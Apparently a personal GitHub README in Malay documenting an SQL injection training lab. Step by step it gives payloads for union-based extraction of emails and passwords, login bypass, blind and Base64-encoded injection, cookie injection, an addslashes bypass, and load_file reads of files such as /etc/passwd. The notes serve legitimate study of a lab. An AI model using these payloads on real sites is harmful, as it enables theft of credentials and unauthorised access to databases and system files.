# SQL Injection Training Lab notes
SQL Injection Training Lab notes for me (Malay Language) 

:warning: **Only for Educational Purpose.**

- notes:
  1. Common Payload untuk test SQLI pada web URL `'`, `"`, `\`, `)'`, `}'`, `\'`, jika berlaku Error Page bermaksud Web itu Vulnerable.
  2. Untuk method `Blind Base` Error Page tidak keluar sebarang paparan tetapi Page menjadi blank.
  3. `--` ini adalah cmd komen untuk SQL.
  4. `+` ini adalah cmd space untuk URL Browser.
  5. Jika String `union all select` di detect oleh web, boleh convert kepada Hex iaitu dalam bentuk `%61` atau lain-lain.

## Table of contents
- [Level A - Basic GET SQL Injection](#level-a---basic-get-sql-injection)
- [Level B - Basic POST SQL Injection](#level-b---basic-post-sql-injection)
- [Level C - POST Bypass Auth](#level-c---post-bypass-auth)
- [Level D - GET Blind Based](#level-d---get-blind-based)
- [Level E - Base64 GET SQL Injection](#level-e---base64-get-sql-injection)
- [Level H - Cookie Base SQL Injection](#level-h---cookie-base-sql-injection)
- [Level I - Bypass AddSlashes SQL Injection](#level-i---bypass-addslashes-sql-injection)
- [Level J - Bypass Real Escape String](#level-j---bypass-real-escape-string)
- [Level K - SQLi to Local File Inclusion Attack](#level-k---sqli-to-local-file-inclusion-attack)

## Level A - Basic GET SQL Injection
- Gambar dibawah adalah contoh jika berlaku Error Page selepas menggunakan Payload `'` == `single quote`.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/4e32639f-6c0e-4c82-bf67-317bc2ff01df)

- Seterusnya menggunakan Payload ini `'--+` Web menjadi normal dan Web ini mempunyai Vuln untuk melakukan sebarang manipulasi di antara Payload tersebut.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/417f7304-7b32-4688-8702-e50e97ce6bad)

- Seterusnya menggunakan Payload ini `'+order+by+6--+` untuk mencari berapa Col yang ada dalam DB tersebut, contoh 6 berlaku Error Page bermaksud DB ini mempunyai 5 Col.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/728fa968-dfb5-4570-a786-c663f8b35833)

- Seterusnya menggunakan Payload ini `?id=-1'+union+all+select+1,2,3,4,5--+` untuk melihat Username dan Email berada di col no berapa, berdasarkan gambar bawah Username terletak di col 2 dan Email terletak di col 3, untuk `2,3` boleh replace apa-apa code contoh `@@version` untuk check version , `database()` untuk check nama DB, `user()` untuk check Username DB.
 
![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e68c2dec-1ada-4a95-82de-d3c84da608fc)

- Seterusnya menggunakan Payload ini `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables--+` untuk senaraikan semua DB Table dalam DB information_schema.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/75903416-fec8-4ba8-b5a1-d6befaa5ec0f)

- Seterusnya menggunakan Payload ini `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+` untuk filter current DB sahaja berdasarkan Payload step sebelumnya.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c3f53df9-f9db-4f76-9c1c-a5f5fd80db56)

- Seterusnya menggunakan Payload ini `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()--+` untuk display semua jenis col dalam DB .

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5c3f8a18-58f9-450b-8b34-6744b7f72d59)

- Seterusnya menggunkan Payload ini `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='users'--+` untuk display semua jenis col dalam DB Table users.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/20974b51-155d-44e1-b871-609104d9eebd)

- Seterusnya menggunkan Payload ini `?id=-1'+union+all+select+1,group_concat(email),group_concat(password),4,5+from+users--+` untuk display Email dan Password disebababkan kita sudah tahu Table mana untuk guna so kita guna `group_concat(email)`, `group_concat(password)`, `from users`.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9dd9dab2-4e32-46bd-add4-1fe787a87b68)

- Done!

## Level B - Basic POST SQL Injection
- notes:
  1. Perbezaan `GET Method` dengan `POST Method` ialah POST tiada di URL Browser dan GET ada di URL Browser.
  2. Guna `space` untuk ganti `+` dalam POST Method.

- Payload `user1'` untuk test Error Page.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9b258237-6335-4e64-84cd-e29f02e2776b)

- Payload `user1'-- ` Web kembali normal dan Web mempunyai Vuln.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e2337ce0-2c05-440b-85ba-c5aea13b2fd2)

- Payload `user1'order by 5-- ` untuk mencari berapa col yang ada dlm DB, contoh 6 dapat Error Page bermaksud ada 5 col dalam DB ini.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f1887807-0685-4449-b862-9c7a6161d3c8)

- Payload `user-1'union all select 1,2,3,4,5-- ` untuk tengok Username dan Email berada di col no berapa, berdasarkan gambar bawah Username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace dengan code lain.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/779ad3ae-ad74-440d-b9c9-699f86e803c4)

- Payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables-- ` untuk senaraikan semua DB Table dalam DB information_schema.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/31af9e0f-04ac-4619-a3be-74ae349f2f92)

- Payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()-- ` sama seperti step sebelumnya tapi filter kepada current DB.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc76091e-ebe5-494d-83c1-f2347a55f614)

- Payload `user-1'union all select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users' and table_schema=database()-- ` untuk display semua jenis col dalam DB Table users.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5f3e4061-f448-4a3d-9985-f9624eee7177)

- Payload `user-1'union all select 1,group_concat(email),group_concat(password),4,5 from users-- ` untuk senarai Email dan Password.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/dc5c638f-be2f-4c0c-b3f9-5d86750151c9)

- Done!

## Level C - POST Bypass Auth
- Payload `'` untuk test Error Page.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/6ba94a2a-bda7-4d3e-8305-d6582f79378b)

- Payload `'-- ` Web menjadi normal bermaksud web ini mempunyai Vuln.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/fd5010f6-14d0-4c94-9edf-03ea16485da9)

- Payload `' or 'a' = 'a` untuk Bypass Login dan paste letak di password sekali, auto dapat masuk login.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f30df5d1-917f-4475-aabf-e3b9a0631812)

- Done!

## Level D - GET Blind Based
- notes:
  1. Blind sama dengan GET Method.
  2. Blind tidak keluar Error atau Data.

- Payload `'` untuk test Error Page tetapi berbeza dengan lain sebab Blind tidak keluar sebarang paparan atau Page menjadi Blank.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/622c5881-2e02-498b-b282-16e20422c651)

- Payload `'--+` Web menjadi normal dan Web mempunyai Vuln.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7f368d86-c3f8-4dc7-abc5-d3fa1cb2b789)

- Payload `'+order+by+5--+` untuk mencari berapa col yang ada dalam DB contoh 6 dapat Blind Error so DB ada 5 col.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bbccdea2-3ebb-4987-9704-8a587d2299d1)

- Payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk tengok Username dan Email dikeluarkan berada di col no berapa, berdasarkan gambar bawah Username terletak di col 2 dan Email terletak di col 3, `2,3` boleh replace dengan code yang lain.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1a51e4f-3619-4ea8-ab1d-2a9d67def8e2)

- Step seterusnya sama saja dengan GET Method.

- Done!

## Level E - Base64 GET SQL Injection

- notes:
  1. Encoded bermaksud berbeza bentuk, contoh ialah Base10, Base64.
  2. Base64 `a-z` `A-Z` `0-9` `/` `+` dan 4 data iaitu `XX==`, `XXX=`, `XXXX`.
  3. Boleh guna Online Tools seperti [Base64 decode encode](https://www.base64decode.org/).

- Payload `1'` dan convert kepada B64 `MSc=` untuk check Error Page.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/8ae0dcee-a744-4c48-9f98-b1504516374e)

- Payload `1'-- ` dan convert kepada B64 `MSctLSA=` Web menjadi normal dan Web mempunyai Vuln.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5452bec6-df24-4917-9c15-44fe740658ad)

- Payload `1' order by 5-- ` dan convert kepada B64 `MScgb3JkZXIgYnkgNS0tIA==` kenapa 5 sebab DB ada 5 col dan col ke 6 dapat Error Page.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5a8141c0-ae0f-40da-bbca-565ca9a7e62f)

- Payload `-1' union all select 1,2,3,4,5-- ` dan convert kepada B64 `LTEnIHVuaW9uIGFsbCBzZWxlY3QgMSwyLDMsNCw1LS0g` untuk check Username dan Email berada di col mana dalam DB.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/3ff88ac0-e86a-4e67-8444-b748dec2f61f)

- Step seterusnya sama dengan level yang lain.

- Done!

## Level H - Cookie Base SQL Injection
- Notes:
  1. Untuk check COOKIE buka `Developer Tools` atau button `F12` atau `Inspect Element` di Browser di bahagian Console taip `document.cookie`
  2. Cookie disimpan di User Browser masing masing.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c75cd5b3-a35f-4532-b367-d2ac0bae1b0d)

- Payload `document.cookie = "userid=2"` untuk tukar kepada user 2.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/afc4f45f-14b4-4630-b112-35f95ff72dd7)

- Payload `document.cookie = "userid=2'"` untuk check Error Page.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/33eb3578-4dcb-490b-bb42-e47d96dc5b34)

- Payload `document.cookie = "userid=1'-- -"` Web menjadi normal dan Web mempunyai Vuln.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7fa4c83f-7ff9-47f2-bdfd-6571455c7053)

- Payload  `document.cookie = "userid=-1'union all select 1,2,3,4,5 -- -"` untuk check Username dan Email berada di col mana dalam DB.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1bb83ee-4f2c-4f67-97e8-848717a43582)

- Step seterusnya sama dengan level yang lain.

- Done!

## Level I - Bypass AddSlashes SQL Injection

- Dengan Payload ini `'` menyebabkan Escape String berlaku disini. Seterusnya gunakan [Hex to String](https://codebeautify.org/hex-string-converter) dan convert `bf5c27` akan keluar char pelik yang boleh digunakan pada Payload seterusnya.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e858813b-197b-4d53-bb60-e765fe22811f)

- Ini adalah char pelik yang boleh digunakan pada Payload seterusnya.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/ef12408e-5210-4828-acda-c68117f45c2f)

- Payload `%bf%5c%27` untuk test Error Page.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc754dd3-dc64-4ee7-a34f-ce79e5fe5286)

- Payload `%bf%5c%27--+` Web menjadi normal dan Web mempunyai Vuln.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/abb0d5be-1c1a-483a-aff8-81c2ec5cf34d)

- Payload `%bf%5c%27order+by+6--+` untuk mencari berapa Col yang ada dalam DB tersebut, contoh 6 berlaku Error Page bermaksud DB ini mempunyai 5 Col.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/b686d968-8000-4a76-8bb6-7bf976aa9015)

- Payload `?id=-1%bf%5c%27union+all+select+1,2,3,4,5--+` untuk tengok Username dan Email dikeluarkan berada di col no berapa, berdasarkan gambar bawah Username terletak di col 2 dan Email terletak di col 3, `2,3` boleh replace dengan code yang lain.

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7b0181a8-e547-4bd0-a1b7-0325001c6211)

- Step seterusnya sama dengan level yang lain.

- Done!

## Level J - Bypass Real Escape String

- Semua step sama macam [Level I - Bypass AddSlashes SQL Injection](#level-i---bypass-addslashes-sql-injection).

- Done!

## Level K - SQLi to Local File Inclusion Attack

- Semua step sama macam [Level A - Basic GET SQL Injection](#level-a---basic-get-sql-injection).

- Yang beza berada disini, Payload `-1'+union+all+select+1,load_file("c://xampp/htdocs/test/html.html"),3,4,5--+`, path `load_file` bergantung pada web storage masing-masing. Gambar bawah menunjukkan content dalam file html.html yang direka.
- contoh path:
  - /etc/passwd
  - /etc/hosts
  - c:/Windows/System32/drivers/etc/hosts

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5b86fda2-a9ff-4588-a7a6-becb84ca3402)

- Done!
